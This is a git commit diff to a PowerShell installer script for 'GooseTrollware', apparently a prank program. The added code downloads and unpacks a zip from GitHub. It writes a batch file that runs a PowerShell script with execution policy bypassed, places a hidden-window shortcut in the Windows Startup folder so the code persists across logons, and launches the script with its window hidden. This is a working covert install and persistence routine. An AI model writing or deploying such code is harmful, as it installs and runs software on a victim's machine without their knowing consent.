5f7a1c59e3794c7a03aded5e2bfcdc54d29775c1
smcbride-ca <smcbride07@hotmail.com>
2023-11-20 21:33:53 -0600

    It works for now

--- i.ps1
+++ i.ps1
@@ -3,9 +3,9 @@ Set-Location $home
 Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G/raw/main/g.zip" -OutFile "GooseTrollware.zip"
 Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force
 
-# Copy VBA script to startup folder
-$gloc="$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.bat"
-@"
+# Copy bat script to startup folder
+$gloc="GooseTrollware\GooseTrollwareLegit.bat"
+$batchContent = @"
 @echo off
 setlocal
 set "psFile=%userprofile%\GooseTrollware\start.ps1"
@@ -13,7 +13,16 @@ set "psFile=%userprofile%\GooseTrollware\start.ps1"
 echo Running PowerShell script...
 powershell.exe -ExecutionPolicy Bypass -File "%psFile%"
 echo PowerShell script run command sent.
-"@ > $gloc
+"@
+$batchContent | Out-File -FilePath $gloc -Encoding ASCII
+
+# Create shortcut to bat script
+# Make sure cmd is hidden
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
+$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.bat"
+$Shortcut.WindowStyle = 7
+$Shortcut.Save()
 
 # Copy powershell script to goose trollware folder (should be moved inside the zip?)
 $gloc2="GooseTrollware\start.ps1"
@@ -39,4 +48,4 @@ while (`$true) {
 
 # And finally we start it
 Start-Sleep 1
-Start-Process "$gloc"
+Start-Process "$gloc" -WindowStyle Hidden
